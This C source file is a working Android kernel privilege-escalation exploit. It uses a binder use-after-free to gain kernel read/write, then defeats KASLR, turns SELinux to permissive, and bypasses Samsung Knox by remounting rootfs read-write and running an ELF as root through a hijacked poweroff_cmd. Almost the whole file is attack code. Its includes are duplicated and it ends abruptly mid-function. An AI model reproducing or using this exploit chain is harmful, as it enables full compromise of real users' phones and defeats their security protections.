#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/epoll.h>

#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/epoll.h>

#include "bad_binder.h"

#include <fcntl.h>
#include <stdio.h>
#include <libgen.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/mount.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "bad_binder.h"
#include "kernel_defs.h"
#include "knox_bypass.h"

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int epfd;

void *dummy_page_4g_aligned;
unsigned long current_ptr;
int binder_fd;

void leak_task_struct(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;

  int b;
  
  int pipefd[2];
  if (pipe(pipefd)) err(1, "pipe");
  if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "pipe size");
  static char page_buffer[0x1000];
  //if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "fill pipe");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    // first page: dummy data
    if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
    close(pipefd[1]);
    printf("CHILD: Finished write to FIFO.\n");

    exit(0);
  }
  //printf("PARENT: Calling READV\n");
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
  printf("writev() returns 0x%x\n", (unsigned int)b);
  // second page: leaked data
  if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
  // Grant: uncomment this if you are having issues getting current_ptr on your kernel
  //hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));

  printf("PARENT: Finished calling READV\n");
  int status;
  if (wait(&status) != fork_ret) err(1, "wait");

  current_ptr = *(unsigned long *)(page_buffer + 0xe8);
  printf("current_ptr == 0x%lx\n", current_ptr);
}

void clobber_addr_limit(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  unsigned long second_write_chunk[] = {
    1, /* iov_len */
    0xdeadbeef, /* iov_base (already used) */
    0x8 + 2 * 0x10, /* iov_len (already used) */
    current_ptr + 0x8, /* next iov_base (addr_limit) */
    8, /* next iov_len (sizeof(addr_limit)) */
    0xfffffffffffffffe /* value to write */
  };

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
  if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
      err(1, "write second chunk to socket");
    exit(0);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  struct msghdr msg = {
    .msg_iov = iovec_array,
    .msg_iovlen = IOVEC_ARRAY_SZ
  };
  int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
  printf("recvmsg() returns %d, expected %lu\n", recvmsg_result,
      (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
}

int kernel_rw_pipe[2];
bool kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "kernel_write failed to load userspace buffer");
  if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "kernel_write failed to overwrite kernel memory");
  return true;
}
bool kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) err(1, "kernel_read failed to read kernel memory");
  if (read(kernel_rw_pipe[0], buf, len) != len) err(1, "kernel_read failed to write out to userspace");
  return true;
}
unsigned long kernel_read_ulong(unsigned long kaddr) {
  unsigned long data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
unsigned long kernel_read_uint(unsigned long kaddr) {
  unsigned int data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
bool kernel_write_ulong(unsigned long kaddr, unsigned long data) {
  kernel_write(kaddr, &data, sizeof(data));
  return true;
}
bool kernel_write_uint(unsigned long kaddr, unsigned int data) {
  kernel_write(kaddr, &data, sizeof(data));
  return true;
}
/// END P0 EXPLOIT ///

//////////////////////////////////////////////////////////////////

static int32_t allocate_kernel_memory(unsigned long kernel_base, uint64_t pFile, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t* ppKernelMem)
{
    int32_t iRet = -1;
    uint64_t pVzalloc = 0;
    uint64_t pFileOps = 0;
    uint64_t pFakeFileOps = 0;
    uint64_t ulReplaceVal = 0;
    bool bPowerOffWrite = false;
    bool bFileOpsWrite = false;
    uint32_t uiAllocAddr = 0;
    uint64_t pKernelMem = 0;
    uint64_t ulAllocSz = KMEM_ALLOC_SIZE;

    pVzalloc = kernel_base + 0x1922AC;

    if(!IS_KERNEL_POINTER(pVzalloc))
    {
        printf("[-] failed to get address of vmalloc_exec!\n");
        goto done;
    }

    printf("[+] found vzalloc ptr: %lx\n", pVzalloc);

    pFileOps = kernel_read_ulong(pFile + FILE_OPS_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pFileOps))
    {
        printf("[-] failed to get pointer to file_operations!\n");
        goto done;
    }

    // The file_operations structure itself is write protected, but the pointer to it in the file structure
    // can be overwriten. This area of memory is used to place the fake file_oerpations structure, since it's
    // writable and not used for anything.
    pFakeFileOps = pPoweroffCmd;
    
    // Save the value to be overwritten, so we can be restore it when we're done.  
    ulReplaceVal = kernel_read_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET);

    if(!kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, pVzalloc))
    {
        printf("[-] failed to write to fake file_operations location!\n");
        goto done;
    }

    bPowerOffWrite = true;

    if(!kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFakeFileOps))
    {
        printf("[-] failed to overwrite file_operations pointer in kernel file structure!\n");
        goto done;
    }

    bFileOpsWrite = true;

    uiAllocAddr = fcntl(iInitFd, F_SETFL, ulAllocSz);
    
    // Guess the top half of the address, since we can only capture them bottom. 
    pKernelMem = (KERNEL_BASE & 0xFFFFFFFF00000000) + uiAllocAddr;

    if(0 != check_kernel_memory_valid(pKernelMem, ulAllocSz))
    {
        printf("[-] the returned memory address is invalid!\n");
        goto done;
    }

    printf("[+] allocated %lx bytes of memory at %lx\n", ulAllocSz, pKernelMem);

    *ppKernelMem = pKernelMem;

    iRet = 0;

done:
    
    if(bFileOpsWrite)
    {
        if(!kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFileOps))
        {
            printf("[-] warning, failed to restore file_operations in /init kernel file structure!");
        }

        bFileOpsWrite = false;
    }
   
    if(bPowerOffWrite)
    {
        if(!kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, ulReplaceVal))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        bPowerOffWrite = false;
    }

    return iRet;
}

static int32_t set_rootfs_mnt_flags(unsigned long kernel_base, uint64_t pFile, int32_t iInitFd, uint64_t pKernelMem)
{
    int iRet = -1;
    uint64_t pRkpAssignMntFlags = 0;
    uint64_t pRkpResetMntFlags = 0;
    uint64_t pMount = 0;
    uint32_t uiMntFlags = 0;
    uint64_t pDentry = 0;
    uint64_t pInode = 0;
    uint64_t pInodeOps = 0;
    uint64_t pFakeDentry = 0;
    uint64_t pFakeInodeOps = 0;
    bool bDentryWrite = false;
    bool bInodeOpsWrite = false;
    struct stat statbuff = {0};

    pRkpAssignMntFlags = kernel_base + 0x1E31A8;

    if(!IS_KERNEL_POINTER(pRkpAssignMntFlags))
    {
        printf("[-] failed to get address of rkp_assign_mnt_flags!\n");
        goto done;
    }

    printf("[+] found rkp_assign_mnt_flags ptr: %lx\n", pRkpAssignMntFlags);

    pRkpResetMntFlags = kernel_base + 0x1E3988;

    if(!IS_KERNEL_POINTER(pRkpResetMntFlags))
    {
        printf("[-] failed to get address of rkp_reset_mnt_flags!\n");
        goto done;
    }

    printf("[+] found rkp_reset_mnt_flags ptr: %lx\n", pRkpResetMntFlags);

    pMount = kernel_read_ulong(pFile + MNT_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pMount))
    {
        printf("[-] failed to get address of mnt!\n");
        goto done;
    }

    uiMntFlags = kernel_read_uint(pMount + MNT_FLAGS_MNT_OFFSET);

    printf("[!] current rootfs mnt flags: %0x\n", uiMntFlags);

    pDentry = kernel_read_ulong(pFile + DENTRY_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pDentry))
    {
        printf("[-] failed to get address of dentry!\n");
        goto done;
    }

    pInode = kernel_read_ulong(pDentry + INODE_DENTRY_OFFSET);

    if(!IS_KERNEL_POINTER(pInode))
    {
        printf("[-] failed to get address of inode!\n");
        goto done;
    }

    pInodeOps = kernel_read_ulong(pInode + INODE_OPS_INODE_OFFSET);

    if(!IS_KERNEL_POINTER(pInodeOps))
    {
        printf("[-] failed to get address of inode_operations!\n");
        goto done;
    }

    // There's definitely a better way to do this, but I'm lazy.
    // Someone smarter than me can improve it if they want.

    if(0 == (pKernelMem & 0xFFFFF))
    {
        pFakeDentry = pKernelMem;
    }

    else
    {
        // Get the first address of allocation where the lowest five digits are 0 
        pFakeDentry = (pKernelMem + KMEM_ALLOC_SIZE) & 0xFFFFFFFFFFF00000;
    }

    // Keep existing mnt flags except for the lock flag digit
    pFakeDentry += (uiMntFlags & 0xFFFFF);
    pFakeInodeOps = pFakeDentry + INODE_DENTRY_OFFSET + sizeof(uint64_t);

    // Check if the fake structure addresses overrun allocated kernel memory
    if(KMEM_ALLOC_SIZE < ((pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET + sizeof(uint64_t)) - pKernelMem))
    {
        printf("[-] kernel memory allocation not in our favor...\n");
        goto done;
    }

    if(!kernel_write_ulong(pFakeDentry + INODE_DENTRY_OFFSET, pInode))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(!kernel_write_ulong(pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET, pRkpAssignMntFlags))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(!kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pFakeDentry))
    {
        printf("[-] failed to write fake dentry to file structure!\n");
        goto done;
    }

    bDentryWrite = true;

    if(!kernel_write_ulong(pInode + INODE_OPS_INODE_OFFSET, pFakeInodeOps))
    {
        printf("[-] failed to write fake inode_operations ptr to inode structure!\n");
        goto done;
    }

    bInodeOpsWrite = true;

    fstat(iInitFd, &statbuff);

    pFakeDentry -= (uiMntFlags & 0xFFFFF);

    if(!kernel_write_ulong(pFakeDentry + INODE_DENTRY_OFFSET, pInode))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(!kernel_write_ulong(pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET, pRkpResetMntFlags))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(!kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pFakeDentry))
    {
        printf("[-] failed to write fake dentry to file structure!\n");
        goto done;
    }

    fstat(iInitFd, &statbuff);

    uiMntFlags = kernel_read_uint(pMount + MNT_FLAGS_MNT_OFFSET);

    printf("[!] new rootfs mnt flags: %0x\n", uiMntFlags);

    if(uiMntFlags & MNT_LOCK_READONLY)
    {
        printf("[-] failed to unset read-only lock mount flag!\n");
        goto done;
    }

    iRet = 0;

done:

    if(bDentryWrite)
    {
        if(!kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pDentry))
        {
            printf("[-] warning! failed to restore overwritten dentry ptr to file structure!\n");
            printf("[-] this will probably make your phone crash...\n");
        }
    }

    if(bInodeOpsWrite)
    {
        if(!kernel_write_ulong(pInode + INODE_OPS_INODE_OFFSET, pInodeOps))
        {
            printf("[-] warning! failed to restore overwritten inode_operations ptr to inode structure!\n");
        }
    }

    return iRet;
}

static int32_t remount_rootfs(unsigned long kernel_base, uint64_t pTaskStruct, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t* ppFile)
{
    int32_t iRet = -1;
    uint64_t pFilesStruct = 0;
    uint64_t pFdTable = 0;
    uint64_t pFdArray = 0;
    uint64_t pFile = 0;
    uint64_t pKernelMem = 0;
    
    pFilesStruct = kernel_read_ulong(pTaskStruct + FILES_STRUCT_TASK_OFFSET);

    if(!IS_KERNEL_POINTER(pFilesStruct))
    {
        printf("[-] failed to get pointer to files_struct!\n");
        goto done;
    }

    pFdTable = kernel_read_ulong(pFilesStruct + FDTABLE_FILES_STRUCT_OFFSET);

    if(!IS_KERNEL_POINTER(pFdTable))
    {
        printf("[-] failed to get pointer to fdtable!\n");
        goto done;
    }

    pFdArray = kernel_read_ulong(pFdTable + FD_ARRAY_FDTABLE_OFFSET);

    if(!IS_KERNEL_POINTER(pFdArray))
    {
        printf("[-] failed to get pointer to fd array!\n");
        goto done;
    }

    pFile = kernel_read_ulong(pFdArray + iInitFd*sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pFile))
    {
        printf("[-] failed to get kernel file structure ptr!\n");
        goto done;
    }

    if(0 == mount("rootfs", "/", "rootfs", MS_REMOUNT|MS_SHARED, NULL))
    {
        printf("[+] rootfs not read-only locked!\n");
        printf("[+] remount successful!\n");
        iRet = 0;
        goto done;
    }

    printf("[!] can't do a remount the easy way...\n");
    printf("[!] time for plan B!\n");

    if(0 != allocate_kernel_memory(kernel_base, pFile, iInitFd, pPoweroffCmd, &pKernelMem))
    {
        printf("[-] failed to allocate kernel memory!\n");
        goto done;
    }

    if(0 != set_rootfs_mnt_flags(kernel_base, pFile, iInitFd, pKernelMem))
    {
        printf("[-] failed to set rootfs mnt flags!\n");
        goto done;
    }

    if(0 != mount("rootfs", "/", "rootfs", MS_REMOUNT|MS_SHARED, NULL))
    {
        printf("[-] remount failed! \n");
        goto done;
    }

    iRet = 0;

done:

    if(0 == iRet)
    {
        *ppFile = pFile;
    }

    return iRet;
}

static int32_t exec_elf_as_root(uint64_t pThreadInfo, uint64_t pFile, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t pOrderlyPoweroff, char* pszFileName, void* pFileMap, uint32_t uiSize)
{
    int32_t iRet = -1;
    uint32_t uiNameLen = 0;
    int32_t iFd = -1;
    uint64_t ulAddrLimit = USER_DS;
    uint64_t pTaskStruct = 0;
    uint64_t pFileOps = 0;
    uint64_t pFakeFileOps = 0;
    uint64_t ulReplaceVal = 0;
    bool bPowerOffWrite = false;
    bool bFileOpsWrite = false;

    uiNameLen = strlen(pszFileName) + 1;

    iFd = open(pszFileName, O_RDWR|O_CREAT, 0777);

    if(0 > iFd)
    {
        printf("[-] failed to create file on rootfs!\n");
        goto done;
    }

    printf("[!] dropping kernel r/w to write file to rootfs\n");

    if(!kernel_write_ulong(pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET, ulAddrLimit))
    {
        printf("[-] failed to restore current thread's addr_limit to its original state\n");
        goto done;
    }

    if(uiSize != write(iFd,pFileMap, uiSize))
    {
        printf("[-] failed to write to rootfs file!\n");
        goto done;
    }

    close(iFd);
    iFd = -1;

    printf("[!] rexploiting to regain kernel r/w\n");

    uint64_t pSecurityHookHeads = 0;
    uint64_t pSecurityCapableListItem = 0;
    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo, &pSecurityHookHeads, &pSecurityCapableListItem, NULL))
    {
        printf("[-] failed to reexploit!\n");
        goto done;
    }

    pFileOps = kernel_read_ulong(pFile + FILE_OPS_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pFileOps))
    {
        printf("[-] failed to get pointer to file_operations!\n");
        goto done;
    }

    // The file_operations structure itself is write protected, but the pointer to it in the file structure
    // can be overwriten. This area of memory is used to place the fake file_oerpations structure, since it's
    // writable and not used for anything.
    pFakeFileOps = pPoweroffCmd;
    
    // Save the value to be overwritten, so we can be restore it when we're done.  
    ulReplaceVal = kernel_read_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET);

    if(!kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, pOrderlyPoweroff))
    {
        printf("[-] failed to write to fake file_operations location!\n");
        goto done;
    }

    if(uiNameLen != kernel_write(pPoweroffCmd, pszFileName, uiNameLen))
    {
        printf("[-] failed to overwrite poweroff_cmd!\n");
        goto done;
    }

    bPowerOffWrite = true;

    if(!kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFakeFileOps))
    {
        printf("[-] failed to overwrite file_operations pointer in kernel file structure!\n");
        goto done;
    }

    bFileOpsWrite = true;

    fcntl(iInitFd, F_SETFL, 0x0);

    printf("[!] sleeping to wait for kernel to execute workqueue before restoring poweroff_cmd\n");
    sleep(3);

    iRet = 0;

done:

    if(bFileOpsWrite)
    {
        if(!kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFileOps))
        {
            printf("[-] warning, failed to restore file_operations in /init kernel file structure!");
        }

        bFileOpsWrite = false;
    }

    if(bPowerOffWrite)
    {
        if(!kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, ulReplaceVal))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        if(0xF != kernel_write(pPoweroffCmd, "/sbin/poweroff", 0xF))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        bPowerOffWrite = false;
    }
    
    if(0 <= iFd)
    {
        close(iFd);
        iFd = -1;
    }

    return iRet;
}

//////////////////////////////////////////////////////////////////////////////////////////

static char * program_name = NULL;


void escalate(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo, uint64_t* ppSecurityHookHeads, uint64_t* ppSecurityCapableListItem, char* pszRootExecPath)
{
#if true
  unsigned char cred_buf[0xd0] = {0};
  unsigned char taskbuf[0x20] = {0};
#endif

  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (dummy_page_4g_aligned != (void*)0x100000000UL)
    err(1, "mmap 4g aligned");
  if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");

  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);
  leak_task_struct();
  clobber_addr_limit();

  setbuf(stdout, NULL);
  printf("should have stable kernel R/W now :)\n");

  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
  printf("current->mm == 0x%lx\n", current_mm);

  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);

  // Grant: break KASLR
  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
  printf("kernel base is 0x%lx\n", kernel_base);

  if (kernel_base & 0xfffUL) errx(1, "bad kernel base (not 0x...000)");

  // Grant: define the below if you want to see how your process creds compare to init (1)
  // useful when understanding what security flags are set

  /* P0: in case you want to do stuff with the creds, to show that you can get them: */
#if true
  unsigned long init_task = kernel_base + SYMBOL__init_task;
  printf("&init_task == 0x%lx\n", init_task);
  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
  printf("init_task.cred == 0x%lx\n", init_task_cred);

  kernel_read(init_task_cred, cred_buf, sizeof(cred_buf));
  printf("init->cred\n");
  hexdump_memory(cred_buf, sizeof(cred_buf));
#endif

  uid_t uid = getuid();
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  // offset 0x78 is pointer to void * security
  unsigned long current_cred_security = kernel_read_ulong(my_cred+0x78);

  printf("current->cred == 0x%lx\n", my_cred);

  // Grant: uncomment if you are having issues proving your R/W is working (run `uname -a`)
  /*unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
  char new_uts_version[] = "EXPLOITED KERNEL";
  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));*/

  printf("Starting as uid %u\n", uid);

#if true
  kernel_read(my_cred, cred_buf, sizeof(cred_buf));

  printf("current->cred\n");
  hexdump_memory(cred_buf, sizeof(cred_buf));

  printf("taskbuf\n");
  kernel_read((current_ptr) & ~0xf, taskbuf, sizeof(taskbuf));
  hexdump_memory(taskbuf, sizeof(taskbuf));

  unsigned long init_cred_security = kernel_read_ulong(init_task_cred+0x78);

  kernel_read(init_cred_security, cred_buf, 0x20);
  printf("init->security_cred\n");
  hexdump_memory(cred_buf, 0x20);

  kernel_read(current_cred_security, cred_buf, 0x20);
  printf("current->security_cred\n");
  hexdump_memory(cred_buf, 0x20);
#endif

/*
  printf("Escalating...\n");

  // change IDs to root (there are eight)
  for (int i = 0; i < 8; i++)
    kernel_write_uint(my_cred+4 + i*4, 0);

  if (getuid() != 0) {
    printf("Something went wrong changing our UID to root!\n");
    exit(1);
  }

  printf("UIDs changed to root!\n");

  // reset securebits
  kernel_write_uint(my_cred+0x24, 0);

  // change capabilities to everything (perm, effective, bounding)
  for (int i = 0; i < 3; i++)
    kernel_write_ulong(my_cred+0x30 + i*8, 0x3fffffffffUL);

  printf("Capabilities set to ALL\n");
*/

  // Grant: was checking for this earlier, but it's not set, so I moved on
  printf("PR_GET_NO_NEW_PRIVS %d\n", prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0));

  unsigned int enforcing = kernel_read_uint(kernel_base + SYMBOL__selinux_enforcing);

  printf("SELinux status = %u\n", enforcing);

  if (enforcing) {
    printf("Setting SELinux to permissive\n");
    kernel_write_uint(kernel_base + SYMBOL__selinux_enforcing, 0);
  } else {
    printf("SELinux is already in permissive mode\n");
  }

    printf("ppTaskStruct = 0x%lx\n", current_ptr);
    *ppTaskStruct = current_ptr;

    printf("ppThreadInfo = 0x%lx\n", current_ptr);
    *ppThreadInfo = current_ptr;

    // DAC BYPASS:

    int32_t ddbpret = -1; 
    uint64_t pSecurityHookHeads = 0;
    uint64_t pSecurityCapableListHead = 0;
    uint64_t pSecurityCapableListItem = 0;

    pSecurityHookHeads = kernel_base + 0x1D71370;

    if(!IS_KERNEL_POINTER(pSecurityHookHeads))
    {
        printf("[-] failed to get address of security_hook_heads!\n");
        return;
    }

    printf("[+] found security_hook_heads ptr: %lx\n", pSecurityHookHeads);

    pSecurityCapableListHead = pSecurityHookHeads + SECURITY_CAPABLE_OFFSET;
    pSecurityCapableListItem = kernel_read_ulong(pSecurityCapableListHead);

    if(!IS_KERNEL_POINTER(pSecurityCapableListItem))
    {
        printf("[-] failed to get security_capable list item!\n");
        return;
    }

    //kernel_write_ulong(pSecurityCapableListHead, pSecurityCapableListHead);

    *ppSecurityHookHeads = pSecurityHookHeads;
    *ppSecurityCapableListItem = pSecurityCapableListItem;

    ///////////////////////////////////////////////////////////

    if(NULL != pszRootExecPath)
    {
        printf("[!] attempting to bypass Knox...\n");

        int32_t iRet = -1;
        char* pszElfName = NULL;
        size_t name_sz = 0;
        char* pszRootfsElfName = NULL;
        int32_t iElfFd = -1;
        struct stat statbuff = {0};
        void* pElfMap = MAP_FAILED;
        uint64_t pOrderlyPoweroff = 0;
        uint64_t pPoweroffCmd = 0;
        int32_t iInitFd = -1;
        uint64_t pFile = 0;
    
        char pszRootExecPath[ ] = "/data/local/tmp/test_elf";
        pszElfName = basename(pszRootExecPath);

        if(NULL == pszElfName)
        {
            printf("[-] failed to get basename of elf path!\n");
        }

        name_sz = strlen(pszElfName);

        if(CHECK_FLAGS_FILE_OPS_OFFSET <= (name_sz + 2))
        {
            printf("[-] elf name too long!\n");
            printf("[-] don't make me do string stuff!\n");
        }

        pszRootfsElfName = malloc(name_sz + 2);

        if(NULL == pszRootfsElfName)
        {
            printf("[-] failed to allocate memory!\n");
        }

        strcpy(pszRootfsElfName, "/");
        strcat(pszRootfsElfName, pszElfName);

        printf("pszRootExecPath = %s\n", pszRootExecPath);
        printf("pszRootfsElfName = %s\n", pszRootfsElfName);

        iElfFd = open(pszRootExecPath, O_RDONLY);

        if(0 > iElfFd)
        {
            printf("[-] failed to open elf file!\n");
        }

        if(0 != fstat(iElfFd, &statbuff))
        {
            printf("[-] failed to stat elf file!\n");
        }

        pElfMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, iElfFd, 0);

        if(MAP_FAILED == pElfMap)
        {
            printf("[-] failed to map elf file!\n");
        }

        pOrderlyPoweroff = kernel_base + 0x4FB14;

        if(!IS_KERNEL_POINTER(pOrderlyPoweroff))
        {
            printf("[-] failed to get address of orderly_poweroff!\n");
        }

        printf("[+] found orderly_poweroff ptr: %lx\n", pOrderlyPoweroff);

        pPoweroffCmd = kernel_base + 0x22A4720;

        if(!IS_KERNEL_POINTER(pPoweroffCmd))
        {
            printf("[-] failed to get address of poweroff_cmd!\n");
        }

        printf("[+] found poweroff_cmd ptr: %lx\n", pPoweroffCmd);

    
        iInitFd = open("/verity_key", O_RDONLY);

        if(0 > iInitFd)
        {
            printf("[-] failed to open /verity_key file!\n");
        }
    

        printf("[!] atttempting to remount rootfs as r/w...\n");

        if(0 != remount_rootfs(kernel_base, current_ptr, iInitFd, pPoweroffCmd, &pFile))
        {
            printf("[-] failed to remount rootfs!\n");
        }

        if(0 != exec_elf_as_root(current_ptr, pFile, iInitFd, pPoweroffCmd, pOrderlyPoweroff, pszRootfsElfName, pElfMap, statbuff.st_size))
        {
            printf("[-] failed to execute elf as root!\n");
        }

        iRet = 0;
        
        if(NULL != pszRootfsElfName)
        {
            free(pszRootfsElfName);
            pszRootfsElfName = NULL;
        }

        if(MAP_FAILED != pElfMap)
        {
            munmap(pElfMap, statbuff.st_size);
            pElfMap = MAP_FAILED;
        }

        if(0 <= iElfFd)
        {
            close(iElfFd);
            iElfFd = -1;
        }

